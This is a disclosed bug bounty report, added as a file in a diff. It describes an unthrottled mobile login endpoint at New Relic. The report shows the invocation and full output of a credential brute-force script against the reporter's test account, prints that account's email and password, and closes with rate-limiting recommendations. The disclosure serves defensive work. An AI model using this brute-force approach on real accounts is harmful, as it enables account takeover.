@@ -1,0 +1,99 @@
+ReportLink:https://hackerone.com/reports/127202
+WeaknessName:Improper Authentication - Generic
+Reporter:https://hackerone.com/arneswinnen
+ReportedTo:New Relic(newrelic)
+BountyAmount:
+Severity:
+State:Closed
+DateOfDisclosure:19.02.2017 22:56:24
+
+Summary:
+
+Dear,
+
+Your web authentication (login) endpoint, https://login.newrelic.com/login, currently properly protects against brute-force attacks. After a couple of 100 automated login attempts, a Captcha is required to login to the account under attack, even from a different IP address. Perfect, good job. I don't see that too often. 
+
+However, your mobile authentication (login) endpoint currently does not have any protection against brute-force attacks. Login requests to https://login.newrelic.com/api/v1/tokens can be sent in a loop with different values for the "password" parameter, and no rate limiting/captcha/account lockout requiring out-of-band verification is present. This allows for brute-forcing of credentials, for example based on breached clear-text password databases of which there are many publicly available (https://wiki.skullsecurity.org/Passwords).
+
+A proof-of-concept python script can be found in attachment. This was invoked to brute-force the credentials of my New Relic test account, ferrariverdasco@gmail.com:Password1!, in a little more than 200 seconds. First, 10.000 wrong guesses are performed taken from a public dictionary (https://github.com/danielmiessler/SecLists/blob/master/Passwords/10k_most_common.txt), after which the 10.001th guess is the correct password and properly identified by the brute-force script. This was then used to login to the mobile app, which worked like a charm - no additional account verification step needed. Of course, a real mass exploitation attack would invoke multiple instances of this script and deploy more threads per instance. It could go at virtually unlimited speeds. 
+
+```
+# cat 10k_most_common.txt | wc -l
+10001
+```
+
+```
+# tail 10k_most_common.txt 
+hoes
+howie
+hevnm4
+hugohugo
+eighty
+epson
+evangeli
+eeeee1
+eyphed
+Password1!
+```
+
+```
+# python newrelicmobilebrute.py ferrariverdasco@gmail.com 10k_most_common.txt 50
+[INFO] Creating 50 worker threads...
+[INFO] Total # passwords: 10001
+[INFO] Total # threads: 50
+71.20 pw/s [] 3% (356/10001)
+57.30 pw/s [=] 5% (573/10001)
+53.67 pw/s [=] 8% (805/10001)
+52.65 pw/s [==] 10% (1053/10001)
+50.84 pw/s [==] 12% (1271/10001)
+50.23 pw/s [===] 15% (1507/10001)
+50.03 pw/s [===] 17% (1751/10001)
+48.98 pw/s [===] 19% (1959/10001)
+49.56 pw/s [====] 22% (2230/10001)
+49.54 pw/s [====] 24% (2477/10001)
+49.89 pw/s [=====] 27% (2744/10001)
+49.32 pw/s [=====] 29% (2959/10001)
+49.85 pw/s [======] 32% (3240/10001)
+49.80 pw/s [======] 34% (3486/10001)
+49.37 pw/s [=======] 37% (3703/10001)
+49.56 pw/s [=======] 39% (3965/10001)
+49.47 pw/s [========] 42% (4205/10001)
+49.12 pw/s [========] 44% (4421/10001)
+49.43 pw/s [=========] 46% (4696/10001)
+49.57 pw/s [=========] 49% (4957/10001)
+49.74 pw/s [==========] 52% (5223/10001)
+49.77 pw/s [==========] 54% (5475/10001)
+49.74 pw/s [===========] 57% (5720/10001)
+49.96 pw/s [===========] 59% (5995/10001)
+49.85 pw/s [============] 62% (6231/10001)
+49.72 pw/s [============] 64% (6463/10001)
+49.95 pw/s [=============] 67% (6743/10001)
+49.76 pw/s [=============] 69% (6967/10001)
+49.70 pw/s [==============] 72% (7206/10001)
+49.68 pw/s [==============] 74% (7452/10001)
+49.54 pw/s [===============] 76% (7679/10001)
+49.68 pw/s [===============] 79% (7949/10001)
+49.75 pw/s [================] 82% (8209/10001)
+49.72 pw/s [================] 84% (8452/10001)
+49.78 pw/s [=================] 87% (8711/10001)
+49.68 pw/s [=================] 89% (8942/10001)
+49.90 pw/s [==================] 92% (9231/10001)
+49.87 pw/s [==================] 94% (9475/10001)
+49.73 pw/s [===================] 96% (9698/10001)
+49.83 pw/s [===================] 99% (9965/10001)
+[SUCCESS] Found the right password: Password1!
+48.79 pw/s [====================] 100% (10001/10001)
+[End] Total time: 207 seconds
+```
+
+One example of a similar vulnerability that was exploited by blackhats in the past would be Apple's Celebgate scandal of January 2015, where celebrity passwords were brute-forced through an unprotected Apple authentication endpoint. In the case of New Relic, this could lead to the compromise of many accounts, since it is a well-known fact that people tend to choose similar passwords which turn up in dictionaries. 
+
+For more info, see http://www.imperva.com/docs/WP_Consumer_Password_Worst_Practices.pdf . A password analysis study of the 32-million clear-text password leak of the rockyou website breach reveals that by guessing the topmost 4655 passwords in this dump against all users, an attacker will gain access to around 20% of those (page 4). That would be a lot of New Relic accounts.
+
+Recommendation on the short-term: Enforce rate limiting on the mobile authentication endpoint based on IP address
+Recommendation on the mid-to-long term: Implement proper account lockout policy / Captcha protection after threshold on the authentication endpoint has been reached by any attacker.
+
+Best regards,
+
+Arne Swinnen
+https://www.arneswinnen.net
